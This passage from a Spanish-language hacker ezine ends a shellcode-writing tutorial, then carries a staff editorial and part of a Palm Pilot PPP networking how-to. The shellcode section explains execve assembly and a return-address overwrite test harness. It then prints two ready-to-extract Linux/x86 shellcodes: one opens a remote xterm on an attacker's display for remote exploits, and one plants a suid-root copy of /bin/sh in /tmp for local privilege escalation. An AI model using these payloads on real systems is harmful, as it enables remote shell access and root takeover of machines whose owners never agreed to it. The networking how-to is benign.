        leal   0xb(%esi),%edi
        movl   %edi,0x16(%esi)
        movl   %eax,0x1a(%esi)
        movb   $0xb,%al
        movl   %esi,%ebx
        leal   0xe(%esi),%ecx
        leal   0x1a(%esi),%edx
        int    $0x80
        xorl   %eax,%eax
        xorl   %ebx,%ebx
        inc    %eax
        int    $0x80
        call   -0x36
        .string \"/bin/ls0-l0-a\"

<-- Fin Codigo -->


Retomemos.. XD

+ <jmp    0x1f>:

Saltar al call, esto funciona exactamente que el ejemplo anterior (como casi
todo).

+ <popl   %esi>:

Idem de lo mismo, salvar el valor del string "/bin/ls0-l0-a" en %esi.

+ <xorl   %eax,%eax>:

Poner %eax a cero.

+ <movb   %al,0x7(%esi)>:

Poner un byte nulo en la direccion de memoria %esi+0x7, es decir, el string
quedaria: "/bin/ls(nulo)-l0-a", y el cero que habia antes se pierde.

+ <movb   %al,0xa(%esi)>:

Poner un byte nulo en la direccion de memoria %esi+0xa. El string quedaria:
"/bin/ls(nulo)-l(nulo)-a".

+ <movb   %al,0xd(%esi)>:

Idem, nulo en %esi+0xd, el string quedaria: "/bin/ls(nulo)-l(nulo)-a(nulo)".

+ <movl   %esi,0xe(%esi)>:

Copia el valor de %esi en la direccion de memoria %esi+0xe. Con esto empeza-
mos a crear el array de punteros *argv[], y le asignamos a argv[0] la dire-
ccion de memoria del string "/bin/ls". La memoria despues de esto tendria
este aspecto:

			/bin/ls(nulo)
			  -l(nulo)		-> Se entiende que va
			  -a(nulo)		   todo seguido.
	  	      (dire de '/bin/ls')
		 
+ <leal   0x8(%esi),%edi>:

Cargamos la direccion de memoria %esi+0x8 en el registro %edi. La razon de
usar un registro intermedio (%edi), es que no podemos copiar el valor de un
registro mas un numero en una direccion de memoria que venga definida por el
valor de un registro mas otro numero. Es decir, "movl 0x1(%esi),0x2(%esi)"
por ejemplo no seria valido, hay que usar un registro intermedio, en este
caso usamos %edi. La direccion %esi+0x8 corresponde a '-l'.

+ <movl   %edi,0x12(%esi)>:

Copiamos el valor de %edi en la direccion de memoria %esi+0x12. El 0x12 es
el resultado de sumar la direccion del anterior argumento + 4, ya que una
direccion de memoria ocupa 4 bytes. En este caso la direccion anterior es
0xe(%esi), por lo tanto ahora copiaremos la segunda direccion (argv[1]) en
0x12(%esi), para tener las direcciones seguidas en memoria y formar asi el
array de punteros *argv[]. La memoria sera ahora algo asi:

                        /bin/ls(nulo)
                          -l(nulo)
                          -a(nulo)
                      (dire de '/bin/ls')
		        (dire de '-l')

+ <leal   0xb(%esi),%edi>:

Cargamos la dire %esi+0xb en %edi, es decir, cargamos la dire de '-a'.

+ <movl   %edi,0x16(%esi)>:

Copiamos la dire en %esi+0x16. Memoria:

                        /bin/ls(nulo)
                          -l(nulo) 
                          -a(nulo)
                      (dire de '/bin/ls')
                        (dire de '-l')
		        (dire de '-a')

+ <movl   %eax,0x1a(%esi)>:

Ponemos un long nulo en %esi+1a para marcar el final del array de punteros
*argv[]. No hace falta que lo ponga pero bueno.. lo pongo igual jeje.

                        /bin/ls(nulo)
                          -l(nulo)
                          -a(nulo)
                      (dire de '/bin/ls')
                        (dire de '-l')
                        (dire de '-a')
			 (Long nulo)

+ <movb   $0xb,%al>:

Poner el valor 0xb (11) en %eax, perteneciente a la syscall de execve.

+ <leal   0xe(%esi),%ecx>:

Cargar en %ecx la direccion de *argv[], con las direcciones de todos los
argumentos a ejecutar.

+ <leal   0x1a(%esi),%edx>:

Cargar un long nulo en %edx.

+ <int    $0x80>:

Ejecutar la interrupcion 0x80 para llamar a la syscall.

Lo siguiente es la llamada a exit(0) por si falla el execve, que como es
exactamente igual que en el ejemplo anterior paso de cometarlo. Bueno, y
ya tenemos la shellcode lista, ahora veamos como se pasa a un string..


---------------------------------------
// 6.- Pasando el codigo a un string
---------------------------------------


Para pasar el codigo en ensamblador al tipico string tipo "\xeb\x4f.." hay 2
metodos. Uno es hacerlo manualmente, un poco rollazo la verdad, pero yo ni
me he molestado en hacerlo de otra manera.. Otro metodo es usar algun progra-
milla que te pase el codigo directamente a un string. Aqui explicare solamen-
te la manera tradicional.

Pues bien, es muy sencillo. Cogemos el codigo y lo metemos enterito a la
funcion _asm_, de tal forma que el source en C quede algo como:

#include <stdio.h>

main()
{
_asm_(
  .
  .
codigo
  .
  .
);
}

Despues lo compilamos y lo ejecutamos con el gdb, en el ejemplo de antes:

$gdb shellcode
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.16 (i586-unknown-linux), Copyright 1996 Free Software Foundation, Inc...
(gdb)
(gdb)disass main
Dump of assembler code for function main:
0x8048404 <main>:       pushl  %ebp
0x8048405 <main+1>:     movl   %esp,%ebp
0x8048407 <main+3>:     jmp    0x8048428 <main+36> -> aqui empieza la scode
0x8048409 <main+5>:     popl   %esi
0x804840a <main+6>:     xorl   %eax,%eax
[..]
(gdb) x/1xb main+3
0x8048407 <main+3>:     0xeb
(gdb) x/1xb main+4
0x8048408 <main+4>:     0x1f

Vamos cogiendo esos valores y los vamos poniendo en el array, quedando algo
parecido a esto:

char shellcode[] = "\xeb\x1f..";

Y vamos rellenando hasta el final, que acabara con tres \xff. Despues copia-
mos el string /bin/sh. Al final la shellcode quedara algo como:

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

Y ya esta, lista para ser utilizada :).


-----------------------------------
// 7.- Comprobando una shellcode
-----------------------------------


Para comprobar facilmente si una shellcode funciona podemos usar el siguiente
codigo en C.


<-- Codigo -->

#include <stdio.h>

char shellcode[] = shellcode;	// aqui poner la sc evidentemente :)

main() {
int *ret;
ret+=2;
*ret = (int)shellcode;
}

<-- Fin Codigo -->


Lo que hacemos es definir un puntero (ret). Como ret es lo unico que esta en
la pila (al declarar la shellcode fuera de main como variable global), si in-
crementamos en 2 posiciones la direccion a la que apunta ret haremos que
apunte a la direccion de retorno de main(). Por lo tanto lo incrementamos en
2 (al ser un puntero a entero cada incremento vale 4 bytes), y despues hace-
mos que apunte a la shellcode, con lo que la misma se ejecutara a la vuelta
de main(). Quizas con un ejemplo 'grafico' se vea mas claro. Nada mas definir
ret, la memoria tendria este aspecto:

			
			  [Shellcode]

			+--------------+
			|     PILA     |
			+==============+
			|     ret      |	# 4 bytes
			+--------------+	
			|     ebp      |	# 4 bytes
			+--------------+
			|   direccion  |	# 4 bytes
			|  de retorno  |
			+--------------+


Entonces si modificamos ret para que apunte a la direccion de retorno (direccion
de ret + 16 bytes), y sobreescribimos la direccion de retorno para que apunte
a la shellcode, quedaria algo como:


                          [Shellcode]
		    	
                        +--------------+
                        |     PILA     |
                        +==============+
                        |     ret      | ---+	# 4 bytes
                        +--------------+    |	
                        |     ebp      |    |	# 4 bytes
                        +--------------+    |
                        | direccion de |    |	# 4 bytes
                        | [shellcode]  | <--+
                        +--------------+


Con lo que conseguimos ejecutar la shellcode. Lo malo de este codigo es que cada
vez que queramos testear una scode tendremos que pasarla primero a string, y si
esto lo hacemos manualmente podemos llegar a perder mucho tiempo en cada testeo.
Por lo tanto lo mejor seria usar este otro codigo:


<-- Codigo -->

#include <stdio.h>

shellcode(){
asm("

[poner el codigo de la shellcode en asm aqui]

");
}

main() {
int *ret;
char scode[512];

strcpy(scode,(char*)shellcode);

ret+=2;
*ret = (int)scode;
}

<-- Fin Codigo -->


Con esto conseguimos el mismo efecto que antes pero sin tener que pasar la
shellcode a un string, ya que el codigo lo hace automaticamente mediante un
strcpy.


-----------------
// 8.- Sources
-----------------


Aqui pego dos codigos de shellcodes echas por mi. La primera ejecuta un xterm
remoto, comprobando el tamaño de la ip, pudiendo cambiar una ip por otra sin
problema. La orden exacta que ejecuta es "xterm -ut -display ip:0". Para ha-
cer la comprobacion simplemente usa un bucle que va comprobando byte a byte
hasta que encuentra el caracter 'K', cuando lo encuentra lo cambia por un nulo
que marca el final del string, y por tanto del argumento del execve.

La segunda lo que hace es copiar "/bin/sh" a "/tmp/katy" y luego darle suid con
el uid del usuario que ejecuto la shellcode, si es root pues root. Para ello
usa fork() y wait_pid() ejecundo cada proceso por separado. El proceso hijo
hace un execve de "/bin/cp /bin/sh /tmp/katy". Como es la shellcode la que se
encarga de ejecutar el 'copy', el fichero "/tmp/katy" tendra como owner el uid
del proceso que ejecuto la shellcode.. Si por ejemplo la shellcode la ejecuto
un proceso que estaba corriendo con suid de root "/tmp/katy" sera algo como:

-rw-r--r--   1 root     root         5489 Oct 18 22:13 katy

Mientras tanto el proceso padre estara esperando que termine la ejecucion del
proceso hijo por medio de una llamada a la funcion/syscall wait_pid. Cuando eso
ocurra el proceso padre hara un chmod a 'katy', por medio de la syscall chmod,
para que el fichero quede algo como esto:

-r-sr-xr-x   1 root     root         5489 Oct 18 22:13 katy

Es decir, al final "/tmp/katy" sera una copia de "/bin/sh", con la particulari-
dad de tener suid de root (en nuestro caso hipotetico).

Salta a la vista que la primera shellcode (xterm.c), es mas practica para
xploits remotos, mientras que la segunda (sh_tmp.c) lo es para xploits locales. 
Para extraer ambas shellcodes a archivos por separado no teneis mas que ejecutar
"./nextract 0x04.txt". Se copiaran en los ficheros xterm.c y sh_tmp.c respectiva-
mente, dentro del directorio "./shellcodes/".


-=-=-=-=-=-=-=-=-=-=-=-=-=-= Shellcodes -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


<++> shellcodes/xterm.c $8d870618a5f2e4d0ca73dff16074e7b2
/*
 *  Linux/x86
 *
 *  execve() of /usr/X11R6/bin/xterm -ut -display ip:0, exit()
 *  127.0.0.1 is an example, you must change it to a useful ip
 *  (making a subrutine into the exploit?)
 *  - you must not delete 'K' after ip:0 -
 */


char shellcode[] =
"\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b"
"\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88"
"\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d"
"\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e"
"\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xac\xff\xff\xff"
"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K";


/* Code */
/*
__asm__("
jmp    0x4f
popl   %esi
xorl   %edx,%edx
movb   %dl,0x14(%esi)
movb   %dl,0x18(%esi)
movb   %dl,0x21(%esi)
movb   $0x2b,%dl
xorl   %ecx,%ecx
movb   $0x9,%cl
cmpb   $0x4b,(%edx,%esi)
je     0x5
inc    %edx
loop   -0x9
jmp    0x2b
movb   %dh,(%edx,%esi)
xorl   %edx,%edx
movl   %esi,%ebx
movl   %esi,0x36(%esi)
leal   0x15(%esi),%edi
movl   %edi,0x3a(%esi)
leal   0x19(%esi),%edi
movl   %edi,0x3e(%esi)
leal   0x22(%esi),%edi
movl   %edi,0x42(%esi)
movl   %edx,0x46(%esi)
leal   0x36(%esi),%ecx
leal   0x46(%esi),%edx
xorl   %eax,%eax
movb   $0xb,%eax
int    $0x80
xorl   %ebx,%ebx
movl   %ebx,%eax
inc    %eax
int    $0x80
call   -0x54
.string \"/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K\"
");
*/
/* RaiSe */
<-->

<++> shellcodes/sh_tmp.c $1593e815df1d94dd70c6c1a8b1d17d31
/*
 *  Linux/x86
 *
 *  /bin/cp /bin/sh /tmp/katy ; chmod 4555 /tmp/sh using fork()
 */


char shellcode[] =
"\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
"\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
"\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
"\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
"\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
"\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
"\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/katy";


/* Code */
/*
__asm__("
        jmp    0x5e
        popl   %edi
        xorl   %eax,%eax
        movb   %al,0x7(%edi)
        movb   %al,0xf(%edi)
        movb   %al,0x19(%edi)
        movl   %edi,0x1a(%edi)
        leal   0x8(%edi),%esi
        movl   %esi,0x1e(%edi)
        xorl   %esi,%esi
        leal   0x10(%edi),%esi
        movl   %esi,0x22(%edi)
        movl   %eax,0x26(%edi)
        movl   %edi,%ebx
        leal   0x1a(%edi),%ecx
        leal   0x26(%edi),%edx
        xorl   %eax,%eax
        movb   $0x2,%al
        int    $0x80
        xorl   %esi,%esi
        cmpl   %eax,%esi
        jne    0x6
        movb   $0xb,%al
        int    $0x80
        jmp    0x1d
        xorl   %edx,%edx
        xorl   %eax,%eax
        xorl   %ebx,%ebx
        dec    %ebx
        leal   0x26(%edi),%ecx
        movb   $0x7,%al
        int    $0x80
        xorl   %eax,%eax
        leal   0x10(%edi),%ebx
        xorl   %ecx,%ecx
        movw   $0x96d,%cx
        movb   $0xf,%al
        int    $0x80
        xorl   %eax,%eax
        inc    %eax
        xorl   %ebx,%ebx
        int    $0x80
        call   -0x63
        .ascii \"/bin/cp8/bin/sh8/tmp/katy\"
");
*/
/* RaiSe */
<-->


-----------------------
// 9.- Notas finales
-----------------------


Bueno, y esto ha llegado a su fin. Como anecdotas mencionar que SI, la ver-
sion de gdb del paste si es la que pone, es que en el momento de escribir el
articulo lo hacia sobre un 486 con Redhat 4.2 :). Y lo de copiar la shell al
fichero "/tmp/katy" os imaginais porque el nombrecito,no?.. (she is my pretty
girlfriend, hehe).

Pues nada mas, nos vemos. Sed buen@s ;).


RaiSe



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x05 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ NetSearch al habla ]-====================================================
=-[ por NetSearch ]-=========================================================




En esta seccion seguiremos tratando temas de actualidad en lo que se refiere
al entorno de NetSearch en general, es decir; noticias, eventos, proyectos,
etc. En algunas ocasiones es posible que simplemente 'salga' algun miembro
del staff dando su opinion sobre algo relacionado de una u otra forma con
la informatica. En este numero me ha tocado a mi (RaiSe) ..

Lo primero me gustaria agradecer desde estas lineas el trabajo que ha hecho
DarK_FeaR en los numeros anteriores. Como sabreis el fue quien creo lo que
estais leyendo ahora, el NetSearch Ezine. Fue hace bastante tiempo ya.. pero
sino hubiese sido por el todo este proyecto no existiria, thanks dark ;). Y
ya que estoy con agradecimientos.. les doy las gracias tambien a tod@s los
que han hecho posible este NS #4, asi como los numeros anteriores. Thanks ;).

Pues bien, como no se de que hablar voy a relataros un poco como comenzo
todo de esto de NetSearch :).. Era alla por el año 1997 sino recuerdo mal..
mas concretamente en verano.. cuando a un grupo de gente se le ocurrio crear
un canal de irc, mas o menos privado, llamado #netsearch. La idea era
compartir conocimientos y aprender unos de otros. Poco a poco se fue uniendo
gente al canal, mucha de la cual ya no esta actualmente, aunque otros
seguimos al pie del cañon ;). Como iba diciendo, en dicho canal empezo a
hablarse de cosas interesantes, como seguridad informatica, algo de
programacion, etc.. Al poco tiempo se formo una lista de correo, la cual
todavia esta funcionando, y ultimamente bastante bien (si quereis apuntaros:
http://www.egroups.com/subscribe/netsearch, la subscripcion es abierta a
todo el mundo).

Al año aproximadamente de la apertura del canal surgio la idea de crear un
Ezine, mas concretamente la idea salio de la cabeza de DarK_FeaR XD. Como habia
bastante colaboracion y ganas nos pusimos a ello, y sacamos 3 bonitos Ezines
:), los cuales estan disponible en nuestra web (www.netsearch-ezine.com). A
partir del tercer numero la cosa se enfrio.. y paso mas de un año sin
NetSearch's q leer.. hasta que hace unos 2 meses unos cuantos decidimos poner
remedio a la situacion.. Se formo un Staff oficial, el cual se comprometio a
sacar adelante el Ezine. Y bueno.. por el momento la cosa parece que funciona
:).

Y en fin, creo que ya me estoy enrollando mas de la cuenta.. XD. Solo os
recuerdo una cosa, si quereis contribuir estamos abiertos a cualquier tipo de
colaboracion, ya sea webs que hagan de distribuidores oficiales, articulos,
etc.. Los articulos podeis mandarlos a editor@netsearch-ezine.com, solo deben
cumplir ciertos requisitos tipicos, como son estar escritos a 80 columnas
como maximo, y no llevar caracteres especiales excepto la eñe. Si quereis
comunicar algo al Staff podeis mandar un mail a staff@netsearch-ezine.com y
nos llegara a todos ;).

Y la ultima cosa.. Para el NetSearch Ezine #5 se abrira una nueva seccion
en la que contestaremos las preguntas de los lectores. Si quereis preguntar
algo para esa seccion mandarlo a staff@netsearch-ezine.com please.

Venga, pues nada mas, ya me voy por donde he venido :). Un saludo a tod@s y
a seguir bien.

RaiSe



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x06 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Interconexion Palm Pilot III/V/VII ]-====================================
=-[ por QuasaR ]-============================================================




			INTERCONEXION PALM PILOT III/V/VII
		      -------------------------------------
			By QuasaR - UNDERSEC Security Team


INTRODUCCION
---------------

Alla por marzo del 96 la compañia 3com se invento una aparatito de lo mas 
curioso que cumplia perfectamente las labores de la agenda electronica 
aparecida años antes (vease casio) pero que ademas iba mas alla con 
caracteristicas mas acercadas a las necesidades de hoy en dia. La politica le 
ha funcionado bien, porque el numero de ventas de Palms se ha ido incrementando
notablemente, al igual que se han ido ampliando las posibilidades y 
caracteristicas de estos dispositivos.

Una de las posibilidades mas grandes que ofrecen las palm pilot es su 
posibilidad de interconexion independientemente del Hardware o OS
el que la deseemos conectar. Si alguien sabe de las mismas posibilidades con
pocketwin que me envie un email.

Los textos sobre palm pilot (& howto's) que podemos encontrar por ahi, en su 
mayoria en ingles, nos tocaran temas muy concretos. Basados principalmente en 
instalacion & programacion de aplicaciones sobre palm. Por lo que echando un
detenido vistazo me he decantado por este texto (mini-howto a fin de cuentas)
sobre interconexion de la palm, mucho menos documentado en ingles y casi cero
en castellano. 



SINCRONIZACION
---------------

Una de las posibilidades inicales que ha traido palm desde siempre ha sido el 
proceso de sincronizacion. Es el proceso mediante el cual es posible 
realizar instalacion & backups de la palm al ordenador y viceversa mediante
el cradle o base. 
No existe ningun misterio bajo plataforma windows, mas que nada porque el 
software que trae la propia palm en su caja, ya es mas que suficiente para 
abastecer todas las  necesidades de sincronia de la palm. Ademas en la 
propia pagina de Palm (http://www.palm.com) esta disponible todos los updates
de este sofware para plataformas windows.

El tema se vuelve un pelin mas exigente para plataformas Linux y FreeBSD.
Para ambos existen un paquete de utilidades+librerias para una correcta
sincronizacion, tanto en modo consola como en modo grafico.

No he probado utilidades como Kpilot (http://www.slac.com/pilone/kpilot_home/)
y similares sobre entorno grafico. Lo que si esta claro es que ofrecen mayor 
comodidad y ciertas mejoras sobre las de consola. Entre ellas la posibilidad de
realizar la mayoria de las operaciones desde un mismo programa (no asi en 
consola). Y la posibilidad de dejar en segundo plano un applett que reconozca 
la pulsacion del boton de sincronia de la base y realice el proceso 
automaticamente.

Para consola en este apartado tenemos las pilot-link 
(ftp://ryeham.ee.ryerson.ca/pub/PalmOS/). 
Un paquete de  herramientas bastante completo. El problema es que segun lo que
queramos hacer necesitaremos de un programa u otro. Aunque las posibilidades 
son practicamente, quitando algunos detallitos, las mismas que sobre la 
plataforma windows.

Para informacion mas detallada sobre las pilot-link hay ya que leerse las man 
(man pilot-link) una vez instalado el paquete. Existe tambien el port con
el patch para versiones de FreeBSD q funciona correctisivamente.

Solo nombrar aki un par de detalles facilmente pasables por alto. A partir del
Palm OS 3.3 la sincronia se puede realizar a una velociadad de 57600. En 
windows accediendo a un simple menu es posible variar la velocidad. Para linux
y FreeBSD hay que asignar un valor a una variable de entorno:

	export PILOTRATE=57600 (o la velocidad que deseemos)

El segundo es tambien para plataformas linux & FreeBSD. Es muy recomendable
un simbolico al serie donde tengamos la palm metida:

	Linux:
		ln -s /dev/pilot /dev/ttyS0 (o ttyS1)

	FreeBSD:

		ln -s /dev/pilot /dev/ttyd0 (o ttyd1)


Para mas informacion sobre sincronia hay que buscar ya en sitios 
oficiales (http://www.palm.com) o menos oficiales (http://www.handango.com)

Y ahora pasamos a una de las opciones mas interesantes de palm...



CONEXION PPP
-------------

La palm lleva una pila TCP/IP bastante resumida pero con enormes posibilidades
y ademas es capaz de soportar conexiones punto a punto. Ya sea con un modem,
a traves de IR (IRDA) sobre un movil (o portatil) o bien al serie de otro 
equipo.

La interconexion de la palm al movil/modem nos da la posibilidad de acceder a 
cualquier sitio desde cualquier lugar que nos encontremos mientras tengamos 
cobertura. Existen clientes de telnet, web, wap, vnc, correo.... para poder
consultar lo que queramos.

La interconexion de la palm desde otro ordenador por ejemplo es mas discutida.
Para que queremos usar la palm, si ya tenemos el ordenador? Pues nunca se sabe.
En casa de un amigo que el tio esta ocupando el ordenador todo el rato. O en 
una party o en una reunion.... el caso es que tenemos un acceso transparente
desde ese ordenador al resto de la red o internet.

Y ahora nos vamos a centrar en este segundo punto:


a) Conexion ppp + palm + windows

La conexion de la palm a traves de plataformas windows es muy sencilla.
Todo se resume a bajarse el programilla Mochappp (http://www.mochasoft.dk) y 
configurarlo, sin ningun misterio, adecuadamente. El programa espera una 
conexion ppp de la palm y le asigna la ip y las dns que posee a la palm.
De esta forma la palm es completamente transparente a todo y todos.
Ya veremos que no ocurre lo mismo en otras plataformas, donde la palm se 
comportara como una maquina mas.
Tan solo hay que tener en cuenta que en el menu de configuracion de red de
la palm:
		
	Prefer (preferencias) -> Red -> Detalles 

Debemos seleccionar que todo este asignado automaticamente y en PPP.

En windows 98 el Mochappp con Palm OS 3.3 funciona perfectamente.

Otra cosa que tambien recalcare mas adelante, es que esta posibilidad de 
conexion ppp a velocidades por encima de 19200 es viable siempre que se tenga 
el OS 3.3 o superior. En caso de no ser asi, existe la utilidad linkdirect.prc 
(http://http://www.vmlinuz.org/palmos/linkdirect.html) para palm que soluciona
esta decadencia en Palm OS anteriores. Yo tuve la posibilidad de probarlo con 
OS 3.0 y salvo evolucion, el programa es de dudoso funcionamiento. Iba cuando 
queria. Pero bueno, es lo que hay.



b) ppp + palm + linux

Llegamos a plataformas Linux. Las pruebas se realizaron sobre debian y un 
2.2.17 y todo funciona perfectisimanente.

Para poder realizar la conexion ppp necesitaremos tener habilitado el
forwarding y el masquerade en nuestro sistema.
Habra que tener compilado en el kernel o como modulo todo
lo relacionado con el forwarding y el masquerade. Ejemplillo de turno:

#
# Networking options
#
# CONFIG_CIPE is not set
CONFIG_PACKET=y
CONFIG_NETLINK=y
CONFIG_RTNETLINK=y
CONFIG_NETLINK_DEV=m
CONFIG_FIREWALL=y
# CONFIG_NET_SECURITY is not set
# CONFIG_FILTER is not set
CONFIG_UNIX=y
CONFIG_INET=y
# CONFIG_IP_MULTICAST is not set
CONFIG_IP_ADVANCED_ROUTER=y
CONFIG_RTNETLINK=y
CONFIG_NETLINK=y
CONFIG_IP_MULTIPLE_TABLES=y
CONFIG_IP_ROUTE_MULTIPATH=y
# CONFIG_IP_ROUTE_TOS is not set
CONFIG_IP_ROUTE_VERBOSE=y
# CONFIG_IP_ROUTE_LARGE_TABLES is not set
CONFIG_IP_ROUTE_NAT=y
# CONFIG_IP_PNP is not set
CONFIG_IP_FIREWALL=y
# CONFIG_IP_FIREWALL_NETLINK is not set
# CONFIG_IP_ROUTE_FWMARK is not set
CONFIG_IP_TRANSPARENT_PROXY=y
CONFIG_IP_MASQUERADE=y
# CONFIG_IP_MASQUERADE_ICMP is not set
# CONFIG_IP_MASQUERADE_MOD is not set
# CONFIG_IP_ROUTER is not set
# CONFIG_NET_IPIP is not set
# CONFIG_NET_IPGRE is not set
CONFIG_IP_ALIAS=y
# CONFIG_ARPD is not set
CONFIG_SYN_COOKIES=y
# CONFIG_INET_RARP is not set
CONFIG_SKB_LARGE=y
# CONFIG_IPV6 is not set
# CONFIG_IPX is not set
# CONFIG_ATALK is not set
# CONFIG_X25 is not set
# CONFIG_LAPB is not set
# CONFIG_BRIDGE is not set
# CONFIG_LLC is not set
# CONFIG_ECONET is not set
# CONFIG_WAN_ROUTER is not set
# CONFIG_NET_FASTROUTE is not set
# CONFIG_NET_HW_FLOWCONTROL is not set
# CONFIG_CPU_IS_SLOW is not set

Ahora y despues de recomilar hay que activar la opcion del forwarding:

echo "1" >  /proc/sys/net/ipv4/ip_forward 

Y cargar los modulos pertinentes segun el servicio que vayamos a usar....

cd  /lib/modules/2.2.1x/ipv4

Ahi tenemos todos los modulos de los servicios a enmarcarar. Ejemplillo
de turno:

-rw-r--r--   1 root     root        11308 Oct 25 15:26 ip_gre.o
-rw-r--r--   1 root     root         4832 Oct 25 15:26 ip_masq_autofw.o
-rw-r--r--   1 root     root         2632 Oct 25 15:26 ip_masq_cuseeme.o
-rw-r--r--   1 root     root         4888 Oct 25 15:26 ip_masq_ftp.o
-rw-r--r--   1 root     root         3548 Oct 25 15:26 ip_masq_irc.o
-rw-r--r--   1 root     root         6276 Oct 25 15:26 ip_masq_mfw.o
-rw-r--r--   1 root     root         4904 Oct 25 15:26 ip_masq_portfw.o
-rw-r--r--   1 root     root         3216 Oct 25 15:26 ip_masq_quake.o
-rw-r--r--   1 root     root         5260 Oct 25 15:26 ip_masq_raudio.o
-rw-r--r--   1 root     root         5244 Oct 25 15:26 ip_masq_user.o
-rw-r--r--   1 root     root         3080 Oct 25 15:26 ip_masq_vdolive.o
-rw-r--r--   1 root     root         9324 Oct 25 15:26 ipip.o

Hay que cargar el que queramos (modprobe).

Una vez cargados los modulos correspondientes tenemos que activar el
enmascaramiento (masquerade). Bastara con:

	ipchains -A forward -s 0/0 -d 0/0 -j MASQ

Si se requiere de un mayor control sobre el masquerade  es mejor que os
leais cierta documentacion sobre ipchains.

Bien, ahora lo que haremos es crear el server pppd y que espere una conexion 
punto a punto en el serie que le digamos. La linea de comandos a utilizar seria,
en su formato mas basico, algo como:

pppd /dev/serie velocidad :ipdepalm parametros

Ejemplillo:

pppd /dev/pilot 57600 :10.0.0.2 local debug passive crtscts noauth 

/dev/pilot 	-> pilot es link a nuestro serie
57600 		-> velocidad que queramos
:10.0.0.2 	-> Aki metemos la ip que la palm va a tener (inventada pero en 
		nuestra misma subred). Es un hecho muy curioso ver como  sobre 
		linux la palm se va a comportar como un dispositivo 
		completamente distinto y que va a formar parte de nuestra red.
local		-> lo usamos para que no espere el tono de la linea telefonica.
debug		-> muestra todo el proceso de conexion (syslog)
crtscts		-> para el control de la comunicacion, la palm lo soporta.
passive 	-> Cuando el LCP no envia un pakete correcto en vez de salir
		aguanta hasta un reset by peer.
noauth		-> sin solicitar autorizacion par ael uso de la linea ppp.

En principio con estos parametros el server ppp (pppd) deberia de quedar a la
escucha. Siempre podremos enriquecer mas nuestro pppd añadiendole mas 
parametros.

pppd /dev/pilot 57600 :10.0.0.2 local debug passive crtscts nodetach proxyarp 
auth &

nodetach	-> para mantener el terminal ocupado mientras se ejecuta pppd
proxy-arp 	-> asigna una direccion mac a la ip de la palm. A fin de 
		cuentas es una alias de la del ordenador al que esta coenctada.
auth		-> Pide autorizacion para el uso de la linea. Utiliza el 
		pap-secrets.
&		-> al tener el nodeatch esto hara que se meta en segundo plano 
			;)

La opcion ms-dns aparece en algunos documentos como valida para asignar 
unas dns's a la palm (la palm soporta esto), sin embargo no nos funciono
por lo que recomiendo asignar manualmente las dns desde la propia palm:

Prefer (preferecias) -> red -> detalles --> kitar checkbox de dns autmaticas

El siguiente paso es asegurar que las rutas son las correctas. Hay que pensar
que vamos a realizar una conexion ppp y que por lo tanto uno de nuestros 
dispositivos PPPx va a ser usado (sea ppp0 o ppp1...  dependiendo de las 
conexiones punto a punto que tengamos establecidas).
En principio, lo adecuado seria que la ruta por defecto de la palm utilizara 
a nuestra makina de gateway por defecto, y deberia funcionar. Igual lo que 
viene a continuacion no es necesario. Sin embargo, por las diferentes 
configuraciones de las rutas estaticas del route puede ser que no haga el 
acceso hasta internet o no pase mas alla de nuestra makina.  Es decir, puede 
que llegue el caso de que con nuestro ordenador si funcione pero fuera de el 
ya no, por culpa del gateway o que los dns son inalcanzables. Ahi van 
diferentes opciones:

	route add ipdepalm dev dispositivo gw ipmakina

o bien tambien tengamos que reconfigurar la ruta por defecto del gateway.

	route del gateway
	route add gateway dev dispositivo-inet

OJO!!!!  aki el dispositivo es el de acceso a internet!. No el que la palm va a 
crear.

ejemplos:

	route add 10.0.0.2 dev ppp0 gw 10.0.0.1

o tambien:

	route del default
	route add default dev ppp0

En este segundo caso, ppp0, es el de inet, el de la palm entonces seria de ppp1
en adelante.

y como pap-secrets de ejemplo:

	quasar  *       password        *

NOTA: los * son necesarios.

Una vez hecho todo esto (muy engorroso de explicar, muy facil de realizar)
tendremos una conexion ppp con la palm. Solo hay que darle al connect de la
palm para que funcione...
Pasemos a la explicacion con FreeBSD y luego expondre datos curiosos y 
conclusiones....



c) ppp + palm + FreeBSD

La configurracion para la conexion de la palm y la Free es muy similar a la de
